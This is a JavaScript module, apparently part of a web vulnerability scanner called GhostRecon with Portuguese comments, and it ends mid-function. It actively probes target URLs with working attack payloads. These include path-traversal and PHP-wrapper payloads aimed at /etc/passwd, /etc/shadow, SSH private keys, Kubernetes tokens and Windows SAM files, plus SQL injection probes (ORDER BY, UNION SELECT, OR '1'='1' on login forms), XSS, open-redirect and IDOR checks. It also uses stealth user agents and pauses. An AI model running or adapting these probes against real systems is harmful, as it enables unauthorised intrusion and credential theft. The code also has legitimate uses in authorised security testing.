import crypto from 'crypto';
import { Buffer } from 'node:buffer';
import { stealthPause, pickStealthUserAgent } from './request-policy.js';
import { attachDecodedExtractions } from './encoding-sniff.js';

const XSS_PARAM_RE = /^(q|query|search|s|keyword|term|message|comment|title|name)$/i;
export const SQLI_PARAM_RE =
  /^(id|ids|user|user_id|uid|account|order|order_id|page|sort|filter|where|username|email|passwd|pwd|login)$/i;
/** Paths típicos de formulário de login (prova OR 1=1 só aqui, com verify_sqli_deep). */
const LOGIN_PATH_RE = /(\/|^)(login|sign-in|signin|auth)(\/|$)/i;
const AUTH_SQLI_PARAM_RE = /^(user(name)?|email|pass(word)?|login|pwd)$/i;
const REDIRECT_PARAM_RE = /^(redirect|url|next|return|return_url|dest|target|goto|callback)$/i;
const IDOR_PARAM_RE = /^(id|user_id|uid|account|order_id|profile_id|invoice_id)$/i;
const LFI_PARAM_RE =
  /^(file|path|page|template|include|inc|doc|document|folder|dir|download|view|cat|module|load|read|filepath|filename|lang|locate|show|nav|layout|render|snippet|f|fn|asset|theme|id|ids|nid|pid|cid|aid|noticia|noticias|artigo|artigos|news|post|posts|slug|item|items|tipo|secao|mensagem|chave|story|opcao|pagina|conteudo|arquivo|arq|ver|mod|ref|rel|opc|cont|body|texto|tpl|banner|opcao_menu|menu|sec|image|img|foto|thumb|text|txt|article|msg|load_file)$/i;
/** Nomes típicos para LFI quando o endpoint é .php e não há query (ou nenhum parâmetro “LFI” na URL). */
const LFI_SYNTHETIC_PARAMS_FULL = [
  'text',
  'id',
  'noticia',
  'file',
  'page',
  'include',
  'path',
  'image',
  'doc',
  'document',
  'lang',
  'template',
  'arquivo',
  'ver',
];
const LFI_SYNTHETIC_PARAMS_LIGHT = ['text', 'id', 'noticia', 'file', 'page', 'include', 'path'];
/** Padrões comuns de erro SQL em respostas HTML/JSON (probe simples com '). */
const SQL_ERROR_RE =
  /(sql syntax|mysql_fetch|mysqli_(query|sql)|sqlstate\[|PDOException|quoted string not properly terminated|unclosed quotation|syntax error at or near|sqlite error|postgresql|ORA-\d{4,5}|Microsoft OLE DB Provider|ODBC SQL Server Driver|Sybase message|Warning:\s*mysql_|You have an error in your SQL syntax)/i;
const LFI_UNIX_RE = /(root:x:0:0:|daemon:x:|bin:x:|nobody:x:|\/bin\/bash|\/usr\/sbin\/nologin)/i;
const LFI_WIN_RE = /(\[extensions\]|\[fonts\]|\[mci extensions\]|for 16-bit app support)/i;
const LFI_PROC_ENV_RE = /\b(PATH|PWD|USER|HOME|SERVER_SOFTWARE|REQUEST_METHOD|SCRIPT_FILENAME)=/i;
const LFI_APACHE_CONF_RE = /(ServerRoot|DocumentRoot|<VirtualHost\b|LoadModule\s)/i;
const LFI_UNATTEND_RE = /<(unattend|unattended|AutoLogon|Password)\b/i;
/** Marcador único em data://text/plain (sem PHP). */
export const LFI_DATA_PLAIN_MARKER = 'GHOSTRECON_LFI_DATA_PLAIN_V1';
/** Conteúdo ASCII em data://;base64 (sem PHP). */
export const LFI_DATA_B64_INNER = 'GR_LFI_DATA_B64_MSG';
/** Corpo POST para php://input (sem tags PHP — só texto). */
export const LFI_PHP_INPUT_POST_MARKER = '___GHOSTRECON_LFI_POST_PROBE_V1___';
const LFI_PROC_FD_META_RE =
  /\b(HTTP_HOST|HTTP_USER_AGENT|HTTP_COOKIE|REQUEST_URI|REQUEST_METHOD|SERVER_SOFTWARE|SCRIPT_FILENAME|DOCUMENT_ROOT|CONTENT_TYPE|CONTENT_LENGTH)=/i;

/** Profundidade relativa típica a partir da raiz web. */
const LFI_TRAV = '../../../../../../../';

/**
 * Resposta a um GET/POST de verificação LFI: classificação + marcador (para meta / testes).
 * @param {string} text
 * @param {string} payload valor injectado no parâmetro
 * @param {{ postBodyMarker?: string }} [meta] — POST php://input: corpo enviado; se reflectir na resposta, sinal próprio.
 */
export function classifyLfiResponse(text, payload, meta = {}) {
  const t = String(text || '');
  const p = String(payload || '');
  if (meta?.postBodyMarker && String(meta.postBodyMarker).length > 6 && t.includes(String(meta.postBodyMarker))) {
    return { classification: 'probable', marker: 'php-input-body-reflected', score: 78 };
  }
  if (p.includes('data:') && t.includes(LFI_DATA_PLAIN_MARKER)) {
    return { classification: 'probable', marker: 'data-plain-reflect', score: 77 };
  }
  if (p.includes('data:') && t.includes(LFI_DATA_B64_INNER)) {
    return { classification: 'probable', marker: 'data-b64-inner-reflect', score: 77 };
  }
  if (p.includes('proc/self/fd') && LFI_PROC_FD_META_RE.test(t.slice(0, 12000)) && t.length < 200000) {
    return { classification: 'probable', marker: 'proc-fd-http-meta-leak', score: 71 };
  }
  if (LFI_UNIX_RE.test(t)) {
    return { classification: 'confirmed', marker: 'unix-passwd-sig', score: 97 };
  }
  if (LFI_WIN_RE.test(t)) {
    return { classification: 'confirmed', marker: 'win.ini-sig', score: 97 };
  }
  if (/BEGIN (OPENSSH|RSA |EC )?PRIVATE KEY/.test(t)) {
    return { classification: 'confirmed', marker: 'pem-private-key', score: 96 };
  }
  if (p.includes('shadow') && /root:\$[0-9$./a-z]{8,}/i.test(t)) {
    return { classification: 'confirmed', marker: 'etc-shadow-hash', score: 95 };
  }
  if (p.includes('serviceaccount') && /(kubernetes\.io|"kind"\s*:\s*"|eyJ[A-Za-z0-9_-]{20,}\.)/i.test(t)) {
    return { classification: 'confirmed', marker: 'k8s-sa-or-token', score: 94 };
  }
  if ((p.includes('php://filter') || p.includes('convert.base64-encode')) && lfiBase64DecodedLooksLikePasswd(t)) {
    return { classification: 'confirmed', marker: 'php-filter-b64-passwd', score: 97 };
  }
  if (p.startsWith('expect://') && /\b(uid|gid|groups)=\d+/i.test(t)) {
    return { classification: 'confirmed', marker: 'expect-cmd-output', score: 93 };
  }
  if (p.includes('127.0.0.1') && /disallow:\s*\S/i.test(t) && /user-agent:/i.test(t)) {
    return { classification: 'probable', marker: 'rfi-loopback-robots', score: 76 };
  }
  if (p.includes('environ') && LFI_PROC_ENV_RE.test(t) && t.length < 120000) {
    return { classification: 'probable', marker: 'proc-self-environ', score: 74 };
  }
  if (p.includes('mounts') && /^\w+\s+\//m.test(t) && /\s\/[\w/]+\s/m.test(t)) {
    return { classification: 'probable', marker: 'proc-mounts', score: 72 };
  }
  if (LFI_APACHE_CONF_RE.test(t) && (p.includes('apache') || p.includes('httpd'))) {
    return { classification: 'probable', marker: 'apache-conf-leak', score: 73 };
  }
  if (LFI_UNATTEND_RE.test(t) && /unattend/i.test(p)) {
    return { classification: 'probable', marker: 'windows-unattend-xml', score: 75 };
  }
  if (p.includes('issue') && /\b(Debian|Ubuntu|Fedora|CentOS|Rocky|Alpine|GNU\/Linux)\b/i.test(t) && t.length < 1200) {
    return { classification: 'probable', marker: 'etc-issue-like', score: 68 };
  }
  if (
    /(failed to open stream|no such file|failed opening|include\(\)|fopen\(|Failed opening required|Path not allowed|open_basedir restriction|wrapper is disabled|protocol\s+not\s+registered|Unable to find the wrapper)/i.test(
      t,
    )
  ) {
    return { classification: 'probable', marker: 'include-wrapper-error', score: 70 };
  }
  return { classification: 'noisy', marker: 'no-signal', score: 32 };
}

function lfiBase64DecodedLooksLikePasswd(text) {
  const s = String(text || '')
    .replace(/<[^>]+>/g, ' ')
    .replace(/\s+/g, '');
  const chunks = s.match(/[A-Za-z0-9+/]{36,}={0,2}/g) || [];
  for (const chunk of chunks.slice(0, 6)) {
    try {
      const dec = Buffer.from(chunk.slice(0, 24000), 'base64').toString('utf8');
      if (/(^|\n)root:[x*!]:0:0:/im.test(dec) || /(^|\n)(daemon|bin|nobody):[x*!]:/im.test(dec)) {
        return true;
      }
    } catch {
      /* ignore */
    }
  }
  return false;
}

function isPhpLikePath(pathname) {
  return /\.(php[0-9]?|phtml|inc)(?:$|[#/?])/i.test(String(pathname || ''));
}

function buildLfiVerifyPayloads() {
  const d = LFI_TRAV;
  const out = [];
  const push = (x) => {
    if (x && out.length < 72) out.push(x);
  };
  push('../../../etc/passwd');
  push('../../../../etc/passwd');
  push('../../../../../etc/passwd');
  /** include("files/".$x) — traversal curto + dupla pasta / encoding */
  push('....//....//etc/passwd');
  push('../etc/passwd');
  push('../../etc/passwd');
  push('files/....//....//etc/passwd');
  push('files/..%2f..%2f..%2f..%2fetc%2fpasswd');
  push(`${d}etc/passwd`);
  push('....//....//....//....//....//....//etc/passwd');
  push('..%2f..%2f..%2f..%2f..%2fetc%2fpasswd');
  push('..%252f..%252f..%252f..%252fetc%252fpasswd');
  push(`php://filter/convert.base64-encode/resource=${d}etc/passwd`);
  push(`php://filter/read=convert.base64-encode/resource=${d}etc/passwd`);
  push('php://filter/convert.iconv.UTF8.UTF16LE/resource=../../../../../../../etc/passwd');
  push('file:///etc/passwd');
  push('expect://id');
  push('http://127.0.0.1/robots.txt');
  push(`data://text/plain,${LFI_DATA_PLAIN_MARKER}`);
  push(`data://text/plain;base64,${Buffer.from(LFI_DATA_B64_INNER, 'utf8').toString('base64')}`);
  push(`data:text/plain;charset=US-ASCII,${LFI_DATA_PLAIN_MARKER}`);
  const relLinux = [
    'etc/issue',
    'etc/group',
    'etc/hostname',
    'etc/ssh/ssh_config',
    'etc/ssh/sshd_config',
    'etc/shadow',
    'var/log/apache2/access.log',
    'var/log/apache2/error.log',
    'var/log/apache/access.log',
    'var/log/httpd/access_log',
    'var/log/httpd/error_log',
    'proc/self/environ',
    'proc/mounts',
    'proc/self/fd/0',
    'proc/self/fd/1',
    'proc/self/fd/2',
    'proc/1/fd/0',
    'root/.ssh/id_rsa',
    'home/www-data/.ssh/id_rsa',
    'var/run/secrets/kubernetes.io/serviceaccount/token',
    'var/lib/mlocate/mlocate.db',
    'var/lib/mlocate.db',
  ];
  for (const rel of relLinux) {
    push(`${d}${rel}`);
  }
  push('..\\..\\..\\..\\..\\windows\\win.ini');
  push('..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts');
  push('..\\..\\..\\..\\..\\windows\\system32\\eula.txt');
  push('..\\..\\..\\..\\..\\windows\\panther\\unattended.xml');
  push('..\\..\\..\\..\\..\\windows\\panther\\unattend\\unattended.xml');
  push('..\\..\\..\\..\\..\\boot.ini');
  push('..\\..\\..\\..\\..\\windows\\repair\\SAM');
  push(`${d}etc/apache2/apache2.conf`);
  push(`${d}usr/local/etc/apache2/httpd.conf`);
  push(`${d}etc/httpd/conf/httpd.conf`);
  push(`${d}var/lib/mysql/mysql/user.frm`);
  return out;
}

const LFI_VERIFY_PAYLOADS = buildLfiVerifyPayloads();
/** Provas curtas só para parâmetros sintéticos (evita centenas de GET por URL .php). */
const LFI_VERIFY_PAYLOADS_SYNTH = LFI_VERIFY_PAYLOADS.slice(0, 26);

/**
 * Decodifica entidades numéricas HTML comuns para não perder `root:x:0:0` escapado em saídas PHP/HTML.
 */
export function decodeHtmlNumericEntitiesForLfi(text) {
  let s = String(text || '');
  s = s.replace(/&#x([0-9a-f]{1,6});/gi, (full, hex) => {
    const cp = parseInt(hex, 16);
    return Number.isFinite(cp) && cp > 8 && cp <= 0x10ffff ? String.fromCodePoint(cp) : full;
  });
  s = s.replace(/&#(\d{1,7});/g, (full, dec) => {
    const cp = parseInt(dec, 10);
    return Number.isFinite(cp) && cp > 8 && cp <= 0x10ffff ? String.fromCodePoint(cp) : full;
  });
  return s;
}

function nowIso() {
  return new Date().toISOString();
}

function buildHeaders(auth = {}, modules = []) {
  const h = {
    'User-Agent': pickStealthUserAgent(modules),
    Accept: 'text/html,application/xhtml+xml,application/json,*/*;q=0.8',
  };
  const extra = auth?.headers && typeof auth.headers === 'object' ? auth.headers : {};
  for (const [k, v] of Object.entries(extra)) {
    if (!k || v == null) continue;
    h[String(k)] = String(v);
  }
  if (auth?.cookie) h.Cookie = String(auth.cookie);
  return h;
}

async function fetchText(url, { auth, timeoutMs = 12000, modules = [], identityCtrl = null } = {}) {
  const init = {
    method: 'GET',
    redirect: 'manual',
    signal: AbortSignal.timeout(timeoutMs),
    headers: buildHeaders(auth, modules),
  };
  if (identityCtrl?.enabled) {
    const res = await identityCtrl.fetchVerifyGet(url, init);
    const text = await res.text().catch(() => '');
    return {
      status: res.status,
      headers: res.headers,
      text: text.slice(0, 160000),
      location: res.headers.get('location') || '',
    };
  }
  await stealthPause(modules);
  const res = await fetch(url, init);
  const text = await res.text().catch(() => '');
  return { status: res.status, headers: res.headers, text: text.slice(0, 160000), location: res.headers.get('location') || '' };
}

/** POST com corpo textual (php://input, uploads simulados). */
async function fetchPostText(url, body, { auth, timeoutMs = 12000, modules = [], identityCtrl = null } = {}) {
  const headers = { ...buildHeaders(auth, modules), 'Content-Type': 'text/plain; charset=utf-8' };
  const init = {
    method: 'POST',
    redirect: 'manual',
    signal: AbortSignal.timeout(timeoutMs),
    headers,
    body: String(body ?? ''),
  };
  if (identityCtrl?.enabled) {
    const res = await identityCtrl.fetchVerifyPost(url, init);
    const text = await res.text().catch(() => '');
    return {
      status: res.status,
      headers: res.headers,
      text: text.slice(0, 160000),
      location: res.headers.get('location') || '',
    };
  }
  await stealthPause(modules);
  const res = await fetch(url, init);
  const text = await res.text().catch(() => '');
  return { status: res.status, headers: res.headers, text: text.slice(0, 160000), location: res.headers.get('location') || '' };
}

function sampleSnippet(text, needle, radius = 90) {
  const s = String(text || '');
  if (!needle) return s.slice(0, 180);
  const i = s.toLowerCase().indexOf(String(needle).toLowerCase());
  if (i < 0) return s.slice(0, 180);
  const st = Math.max(0, i - radius);
  const en = Math.min(s.length, i + String(needle).length + radius);
  return s.slice(st, en).replace(/\s+/g, ' ').trim();
}

export function evidenceHash(evidence) {
  const raw = JSON.stringify({
    source: evidence?.source || '',
    url: evidence?.url || '',
    method: evidence?.method || '',
    status: evidence?.status || 0,
    requestSnippet: evidence?.requestSnippet || '',
    responseSnippet: evidence?.responseSnippet || '',
  });
  return crypto.createHash('sha256').update(raw).digest('hex');
}

export function responseLooksLikeSqlError(text) {
  return SQL_ERROR_RE.test(String(text || ''));
}

/** Primeiro índice ORDER BY n em que aparece erro SQL quando o passo anterior não tinha (vs baseline). */
export function orderByFirstSqlErrorTransition(errBase, snapshots) {
  let prev = !!errBase;
  for (const snap of snapshots || []) {
    const cur = !!snap.sqlErr;
    if (cur && !prev) return snap.n;
    prev = cur;
  }
  return null;
}

/** Pequenos sinais por coluna k em UNION SELECT NULL,... (sem exfiltração). */
export function unionNullProbeSignals(rb, errBase, snapshots) {
  const bits = [];
  const baseLen = String(rb?.text || '').length;
  for (const s of snapshots || []) {
    if (typeof s.k !== 'number') continue;
    if (!!s.sqlErr !== !!errBase) bits.push(`k${s.k}:sql_ne_base`);
    if (baseLen > 80 && s.len > 0) {
      const ratio = Math.abs(s.len - baseLen) / baseLen;
      if (ratio > 0.18) bits.push(`k${s.k}:d_body`);
    }
  }
  return bits;
}

function sqlErrorResponseSnippet(text) {
  const s = String(text || '');
  const m = s.match(SQL_ERROR_RE);
  if (m && m[0]) return sampleSnippet(s, m[0], 140);
  return s.slice(0, 220).replace(/\s+/g, ' ').trim();
}

/**
 * Sondas extra (ORDER BY 1..N, UNION NULL×k, NULL FROM DUAL, OR 1=1 em login).
 * Só com módulo verify_sqli_deep; não enumera information_schema nem sleep.
 */
async function collectSqliDeepMeta(u, paramKey, baseVal, auth, modules, rb, errBase, identityCtrl = null) {
  const bits = [];
  const orderSnapshots = [];
  for (let n = 1; n <= 12; n++) {
    const x = new URL(u.href);
    x.searchParams.set(paramKey, `${baseVal}' ORDER BY ${n}--+`);
    try {
      const r = await fetchText(x.href, { auth, modules, identityCtrl });
      orderSnapshots.push({ n, sqlErr: responseLooksLikeSqlError(r.text), status: r.status });
    } catch {
      orderSnapshots.push({ n, sqlErr: false, status: 0 });
    }
  }
  const obErr = orderByFirstSqlErrorTransition(errBase, orderSnapshots);
  if (obErr != null) bits.push(`orderby_sqlerr@${obErr}`);
  const stFirst = orderSnapshots.find((s) => s.status > 0 && s.status !== rb.status)?.n;
  if (stFirst != null) bits.push(`orderby_status@${stFirst}`);

  const unionSnaps = [];
  for (let k = 1; k <= 6; k++) {
    const unionSel = Array(k)
      .fill('NULL')
      .join(',');
    const x = new URL(u.href);
    x.searchParams.set(paramKey, `${baseVal}' UNION SELECT ${unionSel}-- -`);
    try {
      const r = await fetchText(x.href, { auth, modules, identityCtrl });
      unionSnaps.push({ k, sqlErr: responseLooksLikeSqlError(r.text), len: r.text.length, status: r.status });
    } catch {
      unionSnaps.push({ k, sqlErr: false, len: 0, status: 0 });
    }
  }
  const uBits = unionNullProbeSignals(rb, errBase, unionSnaps);
  if (uBits.length) bits.push(`union:${uBits.slice(0, 5).join(',')}`);

  const xdu = new URL(u.href);
  xdu.searchParams.set(paramKey, `${baseVal}' UNION SELECT NULL FROM DUAL-- -`);
  try {
    const rd = await fetchText(xdu.href, { auth, modules, identityCtrl });
    const r1 = unionSnaps[0];
    if (r1 && responseLooksLikeSqlError(rd.text) !== r1.sqlErr) bits.push('dual_sql_ne_k1');
    else if (r1 && r1.len > 40 && Math.abs(rd.text.length - r1.len) / r1.len > 0.16) bits.push('dual_d_body');
  } catch {
    /* ignore */
  }

  if (LOGIN_PATH_RE.test(u.pathname) && AUTH_SQLI_PARAM_RE.test(String(paramKey).toLowerCase())) {
    const xa = new URL(u.href);
    xa.searchParams.set(paramKey, `${baseVal}' OR '1'='1'--+`);
    try {
      const ra = await fetchText(xa.href, { auth, modules, identityCtrl });
      const lb = rb.text.length;
      const la = ra.text.length;
      if (ra.status !== rb.status || (lb > 80 && Math.abs(la - lb) / lb > 0.12)) bits.push('or_true_delta');
    } catch {
      /* ignore */
    }
  }

  return bits.length ? bits.join(';') : '';
}

function collectEndpointUrlsForVerify(findings, maxEndpoints) {
  const cap = Math.max(1, maxEndpoints);
  const urls = new Set();
  for (const f of findings || []) {
    if (f?.type === 'endpoint' && typeof f.value === 'string' && /^https?:\/\//i.test(f.value)) urls.add(f.value);
  }
  for (const f of findings || []) {
    if (f?.type !== 'param' || typeof f.url !== 'string' || !/^https?:\/\//i.test(f.url)) continue;
    const m = String(f.value || '').match(/^\?([a-zA-Z_][a-zA-Z0-9_]{0,64})=\s*$/);
    if (!m) continue;
    const pName = m[1];
    if (!SQLI_PARAM_RE.test(pName) && !LFI_PARAM_RE.test(pName)) continue;
    try {
      const u = new URL(f.url);
      if (u.searchParams.has(pName)) urls.add(f.url);
    } catch {
      /* ignore */
    }
  }
  return [...urls].slice(0, cap);
}

function pushVerificationFinding(out, kind, classification, score, value, meta, evidence, responseTextForDecode) {
  if (typeof responseTextForDecode === 'string' && responseTextForDecode.length > 24) {
    attachDecodedExtractions(evidence, responseTextForDecode, { maxPerKind: 2, maxUtf8: 4000 });
  }
  let metaOut = meta;
  if (evidence?.decodedExtractions?.length) {
    const bits = evidence.decodedExtractions
      .map((d, i) => {
        const flat = d.decodedUtf8.replace(/\s+/g, ' ').trim();
        const sn = flat.length > 220 ? `${flat.slice(0, 220)}…` : flat;
        return `[${i + 1}:${d.encoding} ${d.decodedBytes}B] ${sn}`;
      })
      .join(' · ');
    metaOut = `${meta} • decoded_snippets=${bits.slice(0, 2000)}`;
  }
  out.push({
    type: kind,
    prio: classification === 'confirmed' ? 'high' : classification === 'probable' ? 'med' : 'low',
    score,
    value,
    meta: metaOut,
    verification: {
      classification,
      evidence: { ...evidence, evidenceHash: evidenceHash(evidence) },
      verifiedAt: nowIso(),
    },
    url: evidence?.url || null,
  });
}

/**
 * Provas LFI GET (lista de payloads) + POST php://input se não houver confirmação GET.
 * @param {{ payloadSet?: 'full' | 'synth' }} [opts] — `synth`: lista curta e sem POST php://input (probes em parâmetros inventados).
 * @returns {Promise<boolean>} true se LFI confirmado via GET
 */
async function runLfiVerificationOnParam(u, paramKey, out, auth, modules, opts = {}) {
  const p = String(paramKey);
  const synth = opts.payloadSet === 'synth';
  const identityCtrl = opts.identityCtrl || null;
  const payloads = synth ? LFI_VERIFY_PAYLOADS_SYNTH : LFI_VERIFY_PAYLOADS;
  let lfiGetConfirmed = false;
  for (const payload of payloads) {
    const x = new URL(u.href);
    x.searchParams.set(p, payload);
    try {
      const r = await fetchText(x.href, { auth, modules, identityCtrl });
      const scanText = decodeHtmlNumericEntitiesForLfi(r.text);
      const { classification, marker, score } = classifyLfiResponse(scanText, payload);
      let needle = '';
      if (LFI_UNIX_RE.test(scanText) || lfiBase64DecodedLooksLikePasswd(scanText)) needle = 'root:';
      else if (LFI_WIN_RE.test(scanText)) needle = '[extensions]';
      else if (/BEGIN (OPENSSH|RSA |EC )?PRIVATE KEY/.test(scanText)) needle = 'BEGIN';
      else if (marker === 'expect-cmd-output') needle = 'uid=';
      else if (marker === 'k8s-sa-or-token') needle = 'kubernetes';
      else if (marker === 'etc-shadow-hash') needle = 'root:$';
      else if (marker === 'rfi-loopback-robots') needle = 'Disallow';
      else if (marker === 'include-wrapper-error') needle = 'stream';
      else if (marker === 'proc-self-environ') needle = 'PATH=';
      else if (marker === 'data-plain-reflect' || marker === 'data-b64-inner-reflect') needle = 'GHOSTRECON';
      else if (marker === 'proc-fd-http-meta-leak') needle = 'HTTP_';
      else if (marker === 'php-input-body-reflected') needle = LFI_PHP_INPUT_POST_MARKER.slice(0, 20);
      else if (payload.includes('passwd')) needle = 'root';
      pushVerificationFinding(
        out,
        'lfi',
        classification,
        score,
        `Verify LFI ${classification.toUpperCase()} @ ${x.pathname} ?${p}=`,
        `verify=lfi • param=${p} • payload=${payload.slice(0, 56)} • marker=${marker} • confidence=${classification}`,
        {
          source: 'verify-lfi',
          url: x.href,
          method: 'GET',
          status: r.status,
          requestSnippet: `${x.pathname}?${p}=${payload.slice(0, 200)}`,
          responseSnippet: sampleSnippet(scanText, needle || (payload.includes('passwd') ? 'root' : '')),
          timestamp: nowIso(),
        },
        r.text,
      );
      if (classification === 'confirmed') {
        lfiGetConfirmed = true;
        break;
      }
    } catch {
      /* ignore */
    }
  }
  if (!lfiGetConfirmed && !synth) {
    try {
      const xIn = new URL(u.href);
      xIn.searchParams.set(p, 'php://input');
      const rIn = await fetchPostText(xIn.href, `${LFI_PHP_INPUT_POST_MARKER}\n`, { auth, modules, identityCtrl });
      const inClass = classifyLfiResponse(rIn.text, 'php://input', {
        postBodyMarker: LFI_PHP_INPUT_POST_MARKER,
      });
      if (inClass.classification !== 'noisy') {
        pushVerificationFinding(
          out,
          'lfi',
          inClass.classification,
          inClass.score,
          `Verify LFI ${inClass.classification.toUpperCase()} @ ${xIn.pathname} ?${p}= (POST php://input)`,
          `verify=lfi • param=${p} • method=POST • wrapper=php://input • marker=${inClass.marker} • confidence=${inClass.classification}`,
          {
            source: 'verify-lfi-php-input',
            url: xIn.href,
            method: 'POST',
            status: rIn.status,
            requestSnippet: `POST ${xIn.pathname}?${p}=php://input body=${LFI_PHP_INPUT_POST_MARKER}`,
            responseSnippet: sampleSnippet(rIn.text, LFI_PHP_INPUT_POST_MARKER.slice(0, 16)),
            timestamp: nowIso(),
          },
          rIn.text,
        );
      }
    } catch {
      /* ignore */
    }
  }
  return lfiGetConfirmed;
}

export async function runEvidenceVerification({
  findings,
  auth,
  log,
  maxEndpoints = 36,
  modules = [],
  identityCtrl = null,
}) {
  const out = [];
  const endpointUrls = collectEndpointUrlsForVerify(findings, maxEndpoints);

  if (!endpointUrls.length) return out;
  if (typeof log === 'function') log(`Verify: analisando ${endpointUrls.length} endpoint(s)`, 'info');

  for (const raw of endpointUrls) {
    let u;
    try {
      u = new URL(raw);
    } catch {
      continue;
    }
    const params = [...u.searchParams.keys()].slice(0, 8);
    const triedKeys = new Set(params.map((k) => String(k).toLowerCase()));
    let lfiConfirmedOnUrl = false;
    const phpLfi = isPhpLikePath(u.pathname);

    for (const p of params) {
      const param = String(p || '').toLowerCase();

      if (XSS_PARAM_RE.test(param)) {
        const marker = `ghxss_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 7)}`;
        const payload = `"'><${marker}>`;
        const x = new URL(u.href);
        x.searchParams.set(p, payload);
        try {
          const r = await fetchText(x.href, { auth, modules, identityCtrl });
          const reflectedRaw = r.text.includes(payload);
          const reflectedMarker = r.text.includes(marker);
          const escaped = r.text.includes('&lt;') && r.text.includes(marker);
          const classification = reflectedRaw && !escaped ? 'confirmed' : reflectedMarker ? 'probable' : 'noisy';
          const score = classification === 'confirmed' ? 96 : classification === 'probable' ? 76 : 36;
          pushVerificationFinding(
            out,
            'xss',
            classification,
            score,
            `Verify XSS ${classification.toUpperCase()} @ ${x.pathname} ?${p}=`,
            `verify=xss • param=${p} • reflected=${reflectedMarker ? 'yes' : 'no'} • escaped=${escaped ? 'yes' : 'no'} • confidence=${classification}`,
            {
              source: 'verify-xss',
              url: x.href,
              method: 'GET',
              status: r.status,
              requestSnippet: `${x.pathname}?${p}=${payload}`,
              responseSnippet: sampleSnippet(r.text, marker),
              timestamp: nowIso(),
            },
            r.text,
          );
        } catch {
          /* ignore */
        }
      }

      if (SQLI_PARAM_RE.test(param)) {
        const b = new URL(u.href);
        const t = new URL(u.href);
        const rawVal = u.searchParams.get(p);
        const baseVal = rawVal != null && String(rawVal).length > 0 ? String(rawVal) : '1';
        const testVal = `${baseVal}'`;
        b.searchParams.set(p, baseVal);
        t.searchParams.set(p, testVal);
        try {
          const [rb, rt] = await Promise.all([
            fetchText(b.href, { auth, modules, identityCtrl }),
            fetchText(t.href, { auth, modules, identityCtrl }),
          ]);
          const errBase = responseLooksLikeSqlError(rb.text);
          const errTest = responseLooksLikeSqlError(rt.text);
          const statusDiff = rb.status !== rt.status;
          const classification = errTest && !errBase ? 'confirmed' : statusDiff ? 'probable' : 'noisy';
          const score = classification === 'confirmed' ? 95 : classification === 'probable' ? 72 : 34;
          let deepSqli = '';
          if (
            modules.includes('verify_sqli_deep') &&
            (classification === 'confirmed' || classification === 'probable')
          ) {
            try {
              deepSqli = await collectSqliDeepMeta(u, p, baseVal, auth, modules, rb, errBase, identityCtrl);
            } catch {
              /* ignore */
            }
          }
          const metaSqli = [
            `verify=sqli • param=${p} • probe=${encodeURIComponent(baseVal)}→${encodeURIComponent(testVal)} • sql_error=${errTest ? 'yes' : 'no'} • status_diff=${statusDiff ? 'yes' : 'no'} • confidence=${classification}`,
            deepSqli ? `deep=${deepSqli}` : '',
          ]
            .filter(Boolean)
            .join(' • ');
          pushVerificationFinding(
            out,
            'sqli',
            classification,
            score,
            `Verify SQLi ${classification.toUpperCase()} @ ${t.pathname} ?${p}=`,
            metaSqli,
            {
              source: 'verify-sqli',
              url: t.href,
              method: 'GET',
              status: rt.status,
              requestSnippet: `${t.pathname}?${p}=${testVal}${deepSqli ? ` (+deep: ORDER BY… UNION…)` : ''}`,
              responseSnippet: sqlErrorResponseSnippet(rt.text),
              timestamp: nowIso(),
            },
            rt.text,
          );
        } catch {
          /* ignore */
        }
      }

      if (REDIRECT_PARAM_RE.test(param)) {
        const x = new URL(u.href);
        x.searchParams.set(p, 'https://example.org/');
        try {
          const r = await fetchText(x.href, { auth, modules, identityCtrl });
          const loc = String(r.location || '');
          const confirmed = /^https?:\/\/example\.org\/?/i.test(loc);
          const probable = !confirmed && /example\.org/i.test(r.text);
          const classification = confirmed ? 'confirmed' : probable ? 'probable' : 'noisy';
          const score = classification === 'confirmed' ? 94 : classification === 'probable' ? 70 : 30;
          pushVerificationFinding(
            out,
            'open_redirect',
            classification,
            score,
            `Verify Open Redirect ${classification.toUpperCase()} @ ${x.pathname} ?${p}=`,
            `verify=open_redirect • param=${p} • location=${loc ? 'present' : 'none'} • confidence=${classification}`,
            {
              source: 'verify-open-redirect',
              url: x.href,
              method: 'GET',
              status: r.status,
              requestSnippet: `${x.pathname}?${p}=https://example.org/`,
              responseSnippet: loc || sampleSnippet(r.text, 'example.org'),
              timestamp: nowIso(),
            },
            r.text,
          );
        } catch {
          /* ignore */
        }
      }

      if (IDOR_PARAM_RE.test(param)) {
        const b = new URL(u.href);
        const t = new URL(u.href);
        b.searchParams.set(p, '1');
        t.searchParams.set(p, '2');
        try {
          const [rb, rt] = await Promise.all([
            fetchText(b.href, { auth, modules, identityCtrl }),
            fetchText(t.href, { auth, modules, identityCtrl }),
          ]);
          const sameStatus = rb.status === rt.status;
          const bodyChanged = rb.text.slice(0, 4000) !== rt.text.slice(0, 4000);
          const maybeUnauthorized = [401, 403].includes(rt.status);
          const classification = sameStatus && bodyChanged && !maybeUnauthorized ? 'probable' : 'noisy';
          const score = classification === 'probable' ? 68 : 28;
          pushVerificationFinding(
            out,
            'idor',
            classification,
            score,
            `Verify IDOR ${classification.toUpperCase()} @ ${t.pathname} ?${p}=`,
            `verify=idor • param=${p} • status_base=${rb.status} status_test=${rt.status} • body_changed=${bodyChanged ? 'yes' : 'no'} • confidence=${classification}`,
            {
              source: 'verify-idor',
              url: t.href,
              method: 'GET',
              status: rt.status,
              requestSnippet: `${t.pathname}?${p}=2`,
              responseSnippet: sampleSnippet(rt.text, ''),
              timestamp: nowIso(),
            },
            rt.text,
          );
        } catch {
          /* ignore */
        }
      }

      if (LFI_PARAM_RE.test(param)) {
        const ok = await runLfiVerificationOnParam(u, p, out, auth, modules, { identityCtrl });
        if (ok) lfiConfirmedOnUrl = true;
      }
    }

    if (phpLfi && !lfiConfirmedOnUrl) {
      const pool = params.length === 0 ? LFI_SYNTHETIC_PARAMS_FULL : LFI_SYNTHETIC_PARAMS_LIGHT;
      const maxSynth = params.length === 0 ? 12 : 6;
      const extras = pool.filter((sp) => !triedKeys.has(String(sp).toLowerCase())).slice(0, maxSynth);
      for (const sp of extras) {
        if (await runLfiVerificationOnParam(u, sp, out, auth, modules, { payloadSet: 'synth', identityCtrl }))
          break;
      }
    }
  }

  return out;
}

/**
 * Segunda ronda leve: variantes de payload em XSS classificados como probable (micro-exploit).
 */
export async function runMicroExploitVariants({
  findings,
  auth,
  log,
  modules = [],
